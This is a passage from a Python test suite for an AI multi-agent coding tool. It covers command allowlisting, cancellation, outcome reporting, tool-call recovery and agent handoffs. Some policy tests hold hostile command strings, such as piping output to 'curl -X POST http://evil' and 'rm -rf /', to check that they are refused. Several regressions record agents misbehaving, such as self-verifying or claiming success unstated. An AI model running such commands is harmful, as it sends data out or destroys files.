    return list(BUILTIN_ROLES.values())


def test_the_proposal_schema_only_offers_real_verifiers():
    """Regression: verify_with was a free string, so the orchestrator could —
    and did — propose itself as the verifier."""
    from trance.agents.orchestrator import propose_flow_tool

    props = (propose_flow_tool(_roles())["function"]["parameters"]
             ["properties"]["steps"]["items"]["properties"])
    assert set(props["check"]["enum"]) == {"tester", "reviewer", "factchecker"}
    assert "orchestrator" not in props["role"]["enum"]     # it assigns work, not does it
    # No fixer here any more: bringing in a second agent on failure is what a
    # loop is, and offering both invited a plan the step editor cannot show.
    assert "on_fail" not in props


def test_the_schema_follows_the_live_library():
    from trance.agents.orchestrator import propose_flow_tool

    custom = AgentRole(name="auditor", title="Auditor", description="", system_prompt="",
                       toolsets=["inspect"], verifier=True)
    plain = AgentRole(name="dba", title="DBA", description="", system_prompt="",
                      toolsets=["files"], paths=["migrations/**"])
    props = (propose_flow_tool([*_roles(), custom, plain])["function"]["parameters"]
             ["properties"]["steps"]["items"]["properties"])
    assert "auditor" in props["check"]["enum"]        # custom verifier offered
    assert "dba" not in props["check"]["enum"]        # cannot verify
    assert "dba" in props["role"]["enum"]             # but can be assigned work
    assert "on_fail" not in props                     # fixers live in loops now


def test_a_proposal_naming_a_non_verifier_as_the_check_drops_it():
    from trance.agents.orchestrator import _normalize

    out = _normalize({"summary": "s", "team": ["backend"], "steps": [
        {"role": "backend", "task": "t", "check": "orchestrator"},
    ]}, _roles())
    assert out["steps"][0]["check"] is None
    assert any("orchestrator" in d for d in out["dropped_checks"])


def test_a_fixer_without_a_check_is_dropped():
    from trance.agents.orchestrator import _normalize

    out = _normalize({"summary": "s", "team": [], "steps": [
        {"role": "backend", "task": "t", "on_fail": "reviewer"},
    ]}, _roles())
    assert out["steps"][0]["on_fail"] is None      # nothing could ever fail


def test_the_orchestrator_cannot_assign_work_to_itself():
    from trance.agents.orchestrator import _normalize

    out = _normalize({"summary": "s", "team": ["orchestrator", "backend"], "steps": [
        {"role": "orchestrator", "task": "do it myself"},
        {"role": "backend", "task": "real work"},
    ]}, _roles())
    assert [s["role"] for s in out["steps"]] == ["backend"]
    assert "orchestrator" not in out["team"]


def test_legacy_verify_with_in_a_proposal_becomes_the_check():
    from trance.agents.orchestrator import _normalize

    out = _normalize({"summary": "s", "team": [], "steps": [
        {"role": "backend", "task": "t", "verify_with": "tester"},
    ]}, _roles())
    assert out["steps"][0]["check"] == "tester"


def test_a_proposed_step_does_not_set_a_try_count():
    """How patient to be with an agent is a property of the agent, set once
    where it is known. A plan that stamps a number on every step overrides it
    everywhere, silently."""
    from trance.agents.orchestrator import _normalize, propose_flow_tool

    out = _normalize({"summary": "s", "team": [], "steps": [
        {"role": "backend", "task": "t", "check": "tester", "max_loops": 99},
    ]}, _roles())
    assert out["steps"][0]["max_loops"] == 0        # 0 = whatever that agent gets

    # And it cannot ask for one: the field is not in the schema.
    schema = propose_flow_tool(_roles())["function"]["parameters"]
    assert "max_loops" not in schema["properties"]["steps"]["items"]["properties"]


def test_check_and_fixer_are_pulled_onto_the_team():
    from trance.agents.orchestrator import _normalize

    out = _normalize({"summary": "s", "team": ["backend"], "steps": [
        {"role": "backend", "task": "t", "check": "factchecker", "on_fail": "reviewer"},
    ]}, _roles())
    assert set(out["team"]) == {"backend", "factchecker", "reviewer"}



# --------------------------------------------- reasoning and truncation

def test_inline_reasoning_never_reaches_the_user():
    """Regression: the orchestrator's chain of thought was shown as its answer."""
    from trance.worker.client import split_reasoning

    visible, reasoning = split_reasoning(
        "<think>The user wants a game. Let me plan.</think>Here is the plan.")
    assert visible == "Here is the plan."
    assert "Let me plan" in reasoning


def test_an_unclosed_think_tag_means_it_was_cut_off():
    from trance.worker.client import split_reasoning

    visible, reasoning = split_reasoning("<think>Wait, the tool allows specifying")
    assert visible == ""                     # better nothing than half a thought
    assert "Wait, the tool allows" in reasoning


def test_plain_answers_are_untouched():
    from trance.worker.client import split_reasoning

    assert split_reasoning("Just an answer.") == ("Just an answer.", "")
    assert split_reasoning("") == ("", "")


def test_parse_routes_inline_reasoning_out_of_the_text():
    from trance.worker.client import _parse

    r = _parse({"choices": [{"message": {
        "content": "<thinking>hmm</thinking>The answer.",
        "reasoning_content": "channelled"}}]})
    assert r.text == "The answer."
    assert "hmm" in r.reasoning and "channelled" in r.reasoning


def test_a_truncated_orchestrator_reply_says_so(monkeypatch, tmp_path):
    from trance.agents import orchestrator
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse, ToolCall

    class Fake:
        def complete(self, messages, tools=None, **kwargs):
            return ChatResponse(
                text="", finish_reason="length",
                tool_calls=[ToolCall(id="1", name="propose_flow", arguments={},
                                     malformed=True)])

    monkeypatch.setattr(orchestrator, "client_for", lambda config: Fake())
    result = orchestrator.chat(messages=[{"role": "user", "content": "build it"}],
                               project_dir=tmp_path, config=ModelConfig(max_tokens=2048),
                               bus=EventBus(), session_id="s")
    assert result["truncated"] is True
    assert result["proposal"] is None
    assert "cut off" in result["text"] and "2048" in result["text"]
    assert "max_tokens" in result["text"]


def test_an_empty_reply_is_reported_rather_than_shown_blank(monkeypatch, tmp_path):
    from trance.agents import orchestrator
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse

    monkeypatch.setattr(orchestrator, "client_for",
                        lambda config: type("F", (), {
                            "complete": lambda self, m, tools=None: ChatResponse(text="")})())
    result = orchestrator.chat(messages=[{"role": "user", "content": "hi"}],
                               project_dir=tmp_path, config=ModelConfig(),
                               bus=EventBus(), session_id="s")
    assert "did not produce a reply" in result["text"]


# ---------------------------------------------------- command hygiene

def test_shell_syntax_works_when_the_agent_has_a_shell(project):
    """The tester was rejected for pipes and redirects it reasonably expected."""
    result = _tools(project, "tester").run_command(
        'ls -la backend/ 2>/dev/null || echo "missing"')
    assert result.detail["kind"] == "command"      # it ran
    assert result.detail["shell"] is True


def test_shell_syntax_is_refused_when_the_agent_has_no_shell(project):
    role = AgentRole(name="plain", title="P", description="", system_prompt="",
                     toolsets=["commands"], commands=["ls", "echo"], shell=False)
    result = AgentTools(project, role).run_command('ls a || echo b')
    assert not result.ok and "not through a shell" in result.text
    assert result.detail == {}                     # nothing ran


def test_plain_commands_still_run(project):
    result = _tools(project, "tester").run_command("python3 -c 'print(1)'")
    assert result.ok and result.detail["kind"] == "command"


def test_a_failing_command_is_not_a_refusal(project):
    """`ok=False` covers both; only one of them means nothing executed."""
    result = _tools(project, "tester").run_command("python3 -c 'import sys; sys.exit(2)'")
    assert result.ok is False
    assert result.detail["kind"] == "command"   # it ran
    assert result.detail["exit_code"] == 2

    refused = _tools(project, "tester").run_command("curl http://x")
    assert refused.ok is False
    assert refused.detail["kind"] == "refused_program"    # it did not run
    assert refused.detail["programs"] == ["curl"]


# ------------------------------------------------- command policy

def test_every_program_in_a_pipeline_is_checked(project):
    """Checking only the first word would let anything through after a pipe."""
    from trance.agents.tools import programs_in

    assert programs_in("pytest -q | head -5 && echo done") == ["pytest", "head", "echo"]
    assert programs_in("npm test; curl http://evil") == ["npm", "curl"]
    assert programs_in("echo hi > /tmp/x && rm -rf /") == ["echo", "rm"]
    # A `;` inside a quoted argument is not an operator.
    assert programs_in("python3 -c 'import sys; sys.exit(1)'") == ["python3"]
    # VAR=value is not the program.
    assert programs_in("NODE_ENV=test npm test") == ["npm"]


def test_a_pipeline_is_refused_if_any_program_is_not_allowed(project):
    tools = _tools(project, "tester")
    result = tools.run_command("pytest -q | curl -X POST http://evil")
    assert not result.ok
    assert result.detail["kind"] == "refused_program"     # nothing executed
    assert result.detail["programs"] == ["curl"]
    assert "'curl'" in result.text


def test_the_global_policy_is_the_default_allowlist(project, monkeypatch):
    from trance.agents import tools as tools_module
    from trance.agents.tools import CommandPolicy

    monkeypatch.setattr(tools_module, "_POLICY", CommandPolicy(allowed=["pytest"], shell=False))
    role = AgentRole(name="p", title="P", description="", system_prompt="",
                     toolsets=["commands"])
    agent = AgentTools(project, role)
    assert agent.allowed_commands == {"pytest"}
    assert agent.shell_enabled is False


def test_a_role_overrides_the_global_policy(project, monkeypatch):
    from trance.agents import tools as tools_module
    from trance.agents.tools import CommandPolicy

    monkeypatch.setattr(tools_module, "_POLICY", CommandPolicy(allowed=["pytest"], shell=False))
    role = AgentRole(name="p", title="P", description="", system_prompt="",
                     toolsets=["commands"], commands=["node", "npm"], shell=True)
    agent = AgentTools(project, role)
    assert agent.allowed_commands == {"node", "npm"}
    assert agent.shell_enabled is True


def test_the_policy_persists(tmp_path):
    from trance.agents.store import CommandStore

    path = tmp_path / "commands.json"
    store = CommandStore(path)
    store.update(allowed=["pytest", "node"], shell=False)

    reopened = CommandStore(path)
    assert reopened.policy.allowed == ["node", "pytest"]
    assert reopened.policy.shell is False
    assert len(reopened.reset().allowed) > 10        # back to the defaults


# ------------------------------------------- long commands and cancelling

def test_a_command_announces_itself_before_it_runs(project):
    """A command that blocks for the full timeout used to show nothing at all
    until it was killed."""
    events = []
    tools = AgentTools(project, BUILTIN_ROLES["tester"],
                       notify=lambda kind, payload: events.append((kind, payload)))
    tools.run_command("echo hi")

    kinds = [k for k, _ in events]
    assert kinds == ["command_started", "command_finished"]
    started = events[0][1]
    assert started["command"] == "echo hi" and started["command_id"]
    assert events[1][1]["command_id"] == started["command_id"]
    assert events[1][1]["exit_code"] == 0


def test_a_running_command_can_be_cancelled(project):
    import threading
    import time

    from trance.agents.tools import cancel_command, running_commands

    ids = []
    tools = AgentTools(project, BUILTIN_ROLES["tester"],
                       notify=lambda kind, p: ids.append(p["command_id"])
                       if kind == "command_started" else None)

    result = {}

    def run():
        result["outcome"] = tools.run_command("python3 -c 'import time; time.sleep(30)'")

    worker = threading.Thread(target=run, daemon=True)
    worker.start()
    for _ in range(50):                     # wait for it to register
        if ids and running_commands():
            break
        time.sleep(0.1)

    assert cancel_command(ids[0]) is True
    worker.join(timeout=15)
    outcome = result["outcome"]
    assert outcome.ok is False
    assert outcome.detail["cancelled"] is True
    assert "Cancelled by the user" in outcome.text
    assert not running_commands()           # deregistered either way


def test_cancelling_an_unknown_command_is_harmless():
    from trance.agents.tools import cancel_command

    assert cancel_command("cmd_nope") is False


def test_a_timeout_points_at_background_mode(project, monkeypatch):
    from trance.agents import tools as tools_module

    monkeypatch.setattr(tools_module, "COMMAND_TIMEOUT_S", 1)
    result = AgentTools(project, BUILTIN_ROLES["tester"]).run_command(
        "python3 -c 'import time; time.sleep(30)'")
    assert result.ok is False
    assert result.detail["timed_out"] is True
    assert "background=true" in result.text


def test_a_refusal_names_the_programs_for_the_ui(project):
    result = _tools(project, "tester").run_command("curl -s http://x | jq .")
    assert result.detail["kind"] == "refused_program"
    assert result.detail["programs"] == ["curl", "jq"]
    assert result.detail["agent"] == "tester"
    assert result.detail["agent_has_own_list"] is False   # so the global list applies


def test_a_trailing_ampersand_runs_in_the_background(project):
    """`node server.js &` used to block for the full timeout: the shell exited
    at once while the real process held our output pipe."""
    import time

    from trance.agents.tools import background_commands, stop_background

    started = time.time()
    result = AgentTools(project, BUILTIN_ROLES["tester"]).run_command(
        "python3 -m http.server 0 --bind 127.0.0.1 &")
    try:
        assert time.time() - started < 10          # returns at once
        assert result.ok is True
        assert result.detail["kind"] == "background"
        assert result.detail["command_id"]
        assert "stop_command" in result.text
        assert background_commands()
    finally:
        stop_background()


def test_a_background_command_that_dies_at_once_is_reported_as_failed(project):
    from trance.agents.tools import background_commands

    result = AgentTools(project, BUILTIN_ROLES["tester"]).run_command(
        "python3 -c 'import sys; sys.exit(3)'", background=True)
    assert result.ok is False
    assert "exited immediately" in result.text
    assert not background_commands()


def test_a_background_process_can_be_cancelled_after_its_shell_exits(project):
    """The tracked process is bash, which returns immediately — cancelling has
    to target the group, or nothing happens and the UI hangs on 'cancelling'."""
    from trance.agents.tools import background_commands, cancel_command

    tools = AgentTools(project, BUILTIN_ROLES["tester"])
    result = tools.run_command("python3 -c 'import time; time.sleep(120)' &")
    command_id = result.detail["command_id"]
    assert cancel_command(command_id) is True
    assert not background_commands()


def test_background_processes_are_stopped_when_a_step_ends(project):
    from trance.agents.tools import background_commands, stop_background

    tools = AgentTools(project, BUILTIN_ROLES["tester"])
    tools.run_command("python3 -c 'import time; time.sleep(120)' &")
    assert background_commands()
    assert len(stop_background()) == 1        # would otherwise hold its port
    assert not background_commands()


def test_cancel_kills_grandchildren_too(project):
    import threading
    import time

    from trance.agents.tools import cancel_command, running_commands

    ids = []
    tools = AgentTools(project, BUILTIN_ROLES["tester"],
                       notify=lambda k, p: ids.append(p["command_id"])
                       if k == "command_started" else None)
    out = {}
    worker = threading.Thread(
        target=lambda: out.update(r=tools.run_command(
            "python3 -c 'import subprocess,time; "
            "subprocess.Popen([\"sleep\",\"60\"]); time.sleep(60)'")),
        daemon=True)
    worker.start()
    for _ in range(60):
        if ids and running_commands():
            break
        time.sleep(0.1)

    assert cancel_command(ids[0]) is True
    worker.join(timeout=20)
    assert "r" in out and out["r"].detail["cancelled"] is True


# ------------------------------------------------- outcome vs integrity

def test_outcome_is_read_from_the_agents_own_last_line():
    from trance.agents.runner import AgentTurn

    assert AgentTurn(text="done\nOUTCOME: SUCCESS").outcome == ("SUCCESS", "")
    outcome, reason = AgentTurn(text="ran it\nOUTCOME: FAILED — 2 tests failed").outcome
    assert outcome == "FAILED" and "2 tests failed" in reason


def test_an_agent_that_states_nothing_is_not_counted_as_success():
    """A tester described a real defect, stopped mid-thought, and the step was
    marked done purely because nothing said otherwise."""
    from trance.agents.runner import AgentTurn

    turn = AgentTurn(text="I've written a test file. Now I need to actually run it.")
    outcome, reason = turn.outcome
    assert outcome == "UNSTATED"
    assert "without stating an outcome" in reason
    assert turn.reported_outcome is False


def test_the_last_outcome_line_wins():
    from trance.agents.runner import AgentTurn

    text = "first attempt\nOUTCOME: FAILED — nope\nthen I fixed it\nOUTCOME: SUCCESS"
    assert AgentTurn(text=text).outcome == ("SUCCESS", "")


def test_working_agents_are_told_to_report_an_outcome():
    for name in ("backend", "frontend", "tester"):
        assert "OUTCOME: SUCCESS" in BUILTIN_ROLES[name].system_prompt
        assert "OUTCOME: FAILED" in BUILTIN_ROLES[name].system_prompt


def test_the_tester_is_told_a_caught_bug_is_a_failed_step():
    prompt = BUILTIN_ROLES["tester"].system_prompt
    assert "good work AND a failed step" in prompt
    assert "VERDICT: PASS" in prompt          # still usable as a check


def test_the_factchecker_checks_truthfulness_not_quality():
    prompt = BUILTIN_ROLES["factchecker"].system_prompt
    assert "report of its own work is TRUE" in prompt
    assert "not a reviewer" in prompt
    assert "the whole run stops" in prompt     # it knows the weight of a FAIL


def test_an_unstated_outcome_opens_the_loop(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "reviewer"])
    step = Step(role="backend", task="t", on_fail="reviewer", max_loops=2)
    order = []

    def fake(**kw):
        order.append(kw["role"].name)
        first = order.count("backend") == 1
        return _Turn(None, "x", outcome=("UNSTATED", "never said") if first
                     else ("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)
    assert order == ["backend", "reviewer", "backend"]   # it did not simply pass
    assert step.status == "done"


# ------------------------------------- XML-shaped tool calls (Qwen/Hermes)

def test_xml_tool_calls_are_recovered():
    """A tester emitted <function=run_command> as text, so the command never
    ran and the step was marked done anyway."""
    from trance.worker.client import salvage_tool_calls

    text = ("I've written a comprehensive test file. Now I need to actually run it.\n\n"
            "<tool_call>\n<function=run_command>\n<parameter=command>\n"
            "python3 tests/test_server_load.py\n</parameter>\n</function>\n</tool_call>")
    (call,) = salvage_tool_calls(text, {"run_command", "write_file"})
    assert call.name == "run_command"
    assert call.arguments == {"command": "python3 tests/test_server_load.py"}


def test_xml_salvage_handles_several_parameters():
    from trance.worker.client import salvage_tool_calls

    text = ("<function=write_file><parameter=path>a.py</parameter>"
            "<parameter=content>X = 1</parameter></function>")
    (call,) = salvage_tool_calls(text, {"write_file"})
    assert call.arguments == {"path": "a.py", "content": "X = 1"}


def test_xml_salvage_refuses_tools_the_role_lacks():
    from trance.worker.client import salvage_tool_calls

    assert salvage_tool_calls(
        "<function=run_command><parameter=command>rm -rf /</parameter></function>",
        {"write_file"}) == []


def test_json_salvage_still_works_alongside_xml():
    from trance.worker.client import salvage_tool_calls

    (call,) = salvage_tool_calls(
        '{"name": "write_file", "arguments": {"path": "a.py", "content": "x"}}',
        {"write_file"})
    assert call.name == "write_file" and call.arguments["path"] == "a.py"


def test_the_tester_is_forbidden_from_weakening_tests():
    prompt = BUILTIN_ROLES["tester"].system_prompt
    assert "Never weaken a test to make it pass" in prompt
    assert "leave the test as it is and report FAILED" in prompt
    assert "defect you were not asked about" in prompt


# ------------------------- the check never routes work to the fixer

def test_a_failing_check_still_never_sends_work_to_the_fixer(tmp_path, monkeypatch):
    """The check only decides whether to halt. Only the outcome loops."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "factchecker", "reviewer"])
    step = Step(role="backend", task="t", check="factchecker",
                on_fail="reviewer", max_loops=3)
    order = []

    def fake(**kw):
        order.append(kw["role"].name)
        if kw["role"].name == "factchecker":
            return _Turn("FAIL", "nothing on disk")
        return _Turn(None, "done", outcome=("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)
    assert "reviewer" not in order          # the fixer was never involved
    assert engine.session.stopping         # it halted instead


def test_the_fixer_runs_without_any_check_configured(tmp_path, monkeypatch):
    """A fixer is about the step's outcome, so it needs no fact check."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "reviewer"])
    step = Step(role="backend", task="t", check=None, on_fail="reviewer", max_loops=2)
    order = []

    def fake(**kw):
        order.append(kw["role"].name)
        first = order.count("backend") == 1
        return _Turn(None, "x",
                     outcome=("FAILED", "port already in use") if first else ("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)
    assert order == ["backend", "reviewer", "backend"]
    assert step.status == "done"


def test_the_fixer_is_briefed_on_the_outcome_not_the_check(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "factchecker", "reviewer"])
    step = Step(role="backend", task="t", check="factchecker",
                on_fail="reviewer", max_loops=2)
    prompts = {}

    def fake(**kw):
        name = kw["role"].name
        prompts.setdefault(name, kw["task"])
        if name == "factchecker":
            return _Turn("PASS", "files are all there")
        if name == "backend":
            first = "backend" not in prompts or len(prompts) < 3
            return _Turn(None, "tried",
                         outcome=("FAILED", "the port was already taken") if first
                         else ("SUCCESS", ""))
        return _Turn(None, "fixed")

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)
    assert "the port was already taken" in prompts["reviewer"]
    assert "files are all there" not in prompts["reviewer"]


# ------------------------------------ server-side truncated tool calls

def test_a_server_rejected_truncated_call_is_recognised():
    """llama.cpp parses tool arguments itself and 500s on a call the model did
    not finish writing."""
    from trance.worker.client import _is_truncated_tool_call

    body = ('{"error":{"code":500,"message":"Failed to parse tool call arguments as JSON: '
            '[json.exception.parse_error.101] parse error at line 1, column 15026: syntax '
            'error while parsing value - invalid string: missing closing quote; last read"}}')
    assert _is_truncated_tool_call(body) is True
    assert _is_truncated_tool_call('{"error":{"message":"out of memory"}}') is False


def test_a_truncated_call_500_does_not_abort_the_step(monkeypatch, tmp_path):
    import urllib.error

    from trance.config import ModelConfig
    from trance.providers.base import BackendError
    from trance.worker.client import ChatClient

    import io

    body = b'{"error":{"message":"Failed to parse tool call arguments as JSON"}}'

    def raise_500(*args, **kwargs):
        raise urllib.error.HTTPError("u", 500, "err", {}, io.BytesIO(body))

    monkeypatch.setattr("urllib.request.urlopen", raise_500)
    response = ChatClient(ModelConfig()).complete([{"role": "user", "content": "hi"}])
    assert response.provider_error == "truncated_tool_call"
    assert response.finish_reason == "length"


def test_other_500s_still_raise(monkeypatch):
    import io
    import urllib.error

    from trance.config import ModelConfig
    from trance.providers.base import BackendError
    from trance.worker.client import ChatClient

    def raise_500(*args, **kwargs):
        raise urllib.error.HTTPError(
            "u", 500, "err", {}, io.BytesIO(b'{"error":{"message":"out of memory"}}'))

    monkeypatch.setattr("urllib.request.urlopen", raise_500)
    with pytest.raises(BackendError):
        ChatClient(ModelConfig()).complete([{"role": "user", "content": "hi"}])


def test_repeated_truncation_fails_the_step_with_a_reason(monkeypatch, tmp_path):
    from trance.agents import runner
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse

    class AlwaysTruncates:
        def complete(self, messages, tools=None, **kwargs):
            return ChatResponse(text="", finish_reason="length",
                                provider_error="truncated_tool_call")

    monkeypatch.setattr(runner, "client_for", lambda config: AlwaysTruncates())
    turn = runner.run_agent(
        role=BUILTIN_ROLES["backend"], task="write a big file", project=tmp_path,
        config=ModelConfig(max_tokens=4096), bus=EventBus(),
        session_id="s", step_id="st")

    assert turn.stop_reason == "truncated_tool_calls"
    assert turn.truncated_calls == 3          # tried, then gave up
    outcome, reason = turn.outcome
    assert outcome == "FAILED" and "4096" in reason


def test_one_truncated_call_is_retried_not_fatal(monkeypatch, tmp_path):
    """The step keeps whatever it already did; the agent is told to write less."""
    from trance.agents import runner
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse

    seen = []

    class TruncatesOnce:
        def __init__(self):
            self.calls = 0

        def complete(self, messages, tools=None, **kwargs):
            self.calls += 1
            seen.append(messages[-1])
            if self.calls == 1:
                return ChatResponse(text="", finish_reason="length",
                                    provider_error="truncated_tool_call")
            return ChatResponse(text="OUTCOME: SUCCESS", finish_reason="stop")

    monkeypatch.setattr(runner, "client_for", lambda config: TruncatesOnce())
    turn = runner.run_agent(
        role=BUILTIN_ROLES["backend"], task="write a big file", project=tmp_path,
        config=ModelConfig(max_tokens=4096), bus=EventBus(),
        session_id="s", step_id="st")

    assert turn.truncated_calls == 1
    assert turn.outcome[0] == "SUCCESS"
    # The retry prompt must say what went wrong, or the model repeats it verbatim.
    assert "cut off" in seen[-1]["content"] and "append_file" in seen[-1]["content"]


# ------------------------------------------------ context gauge numbers

def test_context_usage_prefers_what_the_server_reported(monkeypatch, tmp_path):
    from trance.agents.runner import context_usage
    from trance.config import ModelConfig
    from trance.providers.base import ChatResponse

    config = ModelConfig(context_window=64000, max_tokens=8192)
    messages = [{"role": "user", "content": "x" * 400}]   # ~100 tokens estimated
    usage = context_usage(messages, ChatResponse(
        text="", usage={"prompt_tokens": 32000}), config)

    assert usage["tokens"] == 32000 and usage["estimated"] is False
    assert usage["percent"] == 50.0
    assert usage["budget"] == config.input_budget   # gauge and trimmer agree
    assert usage["reserved"] == 8192


def test_context_usage_falls_back_to_an_estimate(monkeypatch):
    from trance.agents.runner import context_usage
    from trance.config import ModelConfig
    from trance.providers.base import ChatResponse

    usage = context_usage([{"role": "user", "content": "x" * 4000}],
                          ChatResponse(text="", usage={}),
                          ModelConfig(context_window=64000))
    # 3.5 chars/token, not 4: code and JSON are denser than prose, and the
    # estimate ran low exactly where contexts get big.
    assert usage["tokens"] == 1142 and usage["estimated"] is True


# ------------------------------- handing a failure to the fixing agent

def _tester_transcript():
    """What a tester's turn looks like: it reads, writes a test, runs it."""
    return [
        {"tool": "read_file", "arguments": {"path": "server/game.js"}, "ok": True,
         "text": "export function step(){...}" * 200, "detail": {"kind": "read",
                                                                 "path": "server/game.js"}},
        {"tool": "write_file", "arguments": {}, "ok": True, "text": "written",
         "detail": {"kind": "write", "path": "tests/ball.test.js", "created": True,
                    "added": 42, "removed": 0,
                    "diff": "+expect(ball.vx).toBe(-3)"}},
        {"tool": "run_command", "arguments": {}, "ok": False, "text": "",
         "detail": {"kind": "command", "command": "npm test", "exit_code": 1, "seconds": 4,
                    "output": "● ball bounces\n\nExpected: -3\nReceived: 3\n"}},
    ]


def test_the_handoff_keeps_the_failure_and_drops_the_reading():
    from trance.agents.handoff import digest

    text = digest(_tester_transcript(), "OUTCOME: FAILED — the ball passes through the paddle")

    assert "Expected: -3" in text          # the actual evidence
    assert "npm test" in text
    assert "+expect(ball.vx).toBe(-3)" in text
    assert "OUTCOME: FAILED" in text
    # The file it read is named, but its contents are not reprinted — the fixer
    # can pull those itself, and they are most of the transcript.
    assert "looked at server/game.js" in text
    assert "export function step" not in text


def test_the_handoff_gives_up_routine_output_before_the_failure():
    from trance.agents.handoff import digest

    noisy = [{"tool": "run_command", "arguments": {}, "ok": True, "text": "",
              "detail": {"kind": "command", "command": f"npm run lint{i}", "exit_code": 0,
                         "seconds": 1, "output": "clean\n" * 500}}
             for i in range(6)]
    text = digest(noisy + _tester_transcript(), "OUTCOME: FAILED — bug", budget_chars=3000)

    assert len(text) <= 3600                       # roughly inside the budget
    assert "Expected: -3" in text                  # the failure survives
    assert "npm run lint5" in text                 # the routine runs are still named
    assert text.count("clean") < 100               # but not quoted at length


def test_the_closing_report_is_never_trimmed_away():
    from trance.agents.handoff import digest

    report = "OUTCOME: FAILED — " + "the paddle collision is inverted. " * 30
    text = digest(_tester_transcript(), report, budget_chars=200)
    assert report.strip() in text


def test_an_empty_turn_hands_over_nothing():
    from trance.agents.handoff import digest

    assert digest([], "") == ""


def test_the_fixer_is_shown_what_the_failing_agent_did(tmp_path, monkeypatch):
    """Regression: the fixer was told only that the step failed and why, so its
    first move was always to re-run the suite it had just been told about."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["tester", "backend"])
    step = Step(role="tester", task="test the paddle", on_fail="backend", max_loops=2)
    prompts = {}

    def fake(**kw):
        name = kw["role"].name
        prompts.setdefault(name, kw["task"])
        if name == "tester":
            passed = "backend" in prompts
            return _Turn(None, "OUTCOME: FAILED — the ball passes through",
                         outcome=("SUCCESS", "") if passed
                         else ("FAILED", "the ball passes through"),
                         transcript=_tester_transcript())
        return _Turn(None, "fixed the collision", outcome=("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    brief = prompts["backend"]
    assert "npm test" in brief and "Expected: -3" in brief
    assert "tests/ball.test.js" in brief
    assert "do not repeat it" in brief          # told not to re-derive it


def test_a_rerunning_agent_is_reminded_of_its_own_previous_pass(tmp_path, monkeypatch):
    """With no fixer the same role runs again — in a fresh conversation, so it
    has forgotten the pass that just failed."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["tester"])
    step = Step(role="tester", task="test the paddle", max_loops=2)
    steering = []

    def fake(**kw):
        steering.append(kw.get("steering") or [])
        failed = len(steering) == 1
        return _Turn(None, "report",
                     outcome=("FAILED", "the ball passes through") if failed
                     else ("SUCCESS", ""),
                     transcript=_tester_transcript())

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert steering[0] == []
    second = "\n".join(steering[1])
    assert "the ball passes through" in second
    assert "Expected: -3" in second


# ---------------------------------------------- building a file in pieces

def _tools_with_approval(tmp_path, role, broker):
    from trance.agents.tools import AgentTools

    role = BUILTIN_ROLES[role] if isinstance(role, str) else role
    return AgentTools(tmp_path, role, None, notify=lambda *a, **k: None,
                      approve=broker.ask, session_id="s", step_id="st")


def _tools(tmp_path, role_name="backend"):
    from trance.agents.tools import AgentTools

    return AgentTools(tmp_path, BUILTIN_ROLES[role_name], None, notify=lambda *a, **k: None)


def test_a_file_can_be_built_up_across_several_calls(tmp_path):
    """A model cannot emit more tokens than the context it has left, so a long
    file has to arrive in pieces or not at all."""
    tools = _tools(tmp_path)
    tools.call("write_file", {"path": "server/app.js", "content": "// part 1\n"})
    outcome = tools.call("append_file", {"path": "server/app.js", "content": "// part 2\n"})

    assert outcome.ok
    assert (tmp_path / "server/app.js").read_text() == "// part 1\n// part 2\n"
    assert outcome.detail["appended"] is True
    assert outcome.detail["removed"] == 0        # appending never deletes
    assert "2 lines" in outcome.text


def test_append_creates_the_file_when_it_is_missing(tmp_path):
    tools = _tools(tmp_path)
    outcome = tools.call("append_file", {"path": "server/new.js", "content": "x\n"})
    assert outcome.ok and outcome.detail["created"] is True
    assert (tmp_path / "server/new.js").read_text() == "x\n"


def test_append_obeys_the_remit_like_any_write(tmp_path):
    """The bypass would be obvious otherwise: append to a file you may not write."""
    tools = _tools(tmp_path, "tester")           # may write tests/**, nothing else
    outcome = tools.call("append_file", {"path": "server/app.js", "content": "sneaky"})
    assert outcome.ok is False
    assert outcome.remit_violation == "server/app.js"
    assert not (tmp_path / "server/app.js").exists()


def test_an_agent_without_the_files_toolset_cannot_append(tmp_path):
    tools = _tools(tmp_path, "factchecker")
    outcome = tools.call("append_file", {"path": "a.txt", "content": "x"})
    assert outcome.ok is False and "do not have" in outcome.text


def test_agents_are_told_how_to_write_a_file_too_long_for_one_reply():
    from trance.agents.tools import permissions_brief

    brief = permissions_brief(BUILTIN_ROLES["backend"])
    assert "append_file" in brief and "cut off" in brief


# ------------------------------------------ shared memory across agents

def test_a_note_reaches_the_next_agents_prompt(tmp_path):
    from trance.agents.memory import ProjectMemory

    memory = ProjectMemory(tmp_path)
    stored, message = memory.note("backend", "the API is POST /api/games returning {id, state}")
    assert stored and "every agent after you" in message
    assert "POST /api/games" in memory.for_prompt()
    assert "**backend**" in memory.for_prompt()      # who decided it, not just what


def test_memory_survives_a_new_process(tmp_path):
    from trance.agents.memory import ProjectMemory

    ProjectMemory(tmp_path).note("backend", "the server listens on port 3100")
    assert "3100" in ProjectMemory(tmp_path).for_prompt()
    assert (tmp_path / ".trance" / "memory.md").exists()   # editable by hand


def test_the_same_fact_is_not_stored_twice(tmp_path):
    """Every note is paid for by every later agent, so duplicates matter."""
    from trance.agents.memory import ProjectMemory

    memory = ProjectMemory(tmp_path)
    memory.note("backend", "the server listens on port 3100")
    stored, message = memory.note("frontend", "The server listens on port 3100.")

    assert stored is False and "Already in project memory" in message
    assert len(memory.notes()) == 1


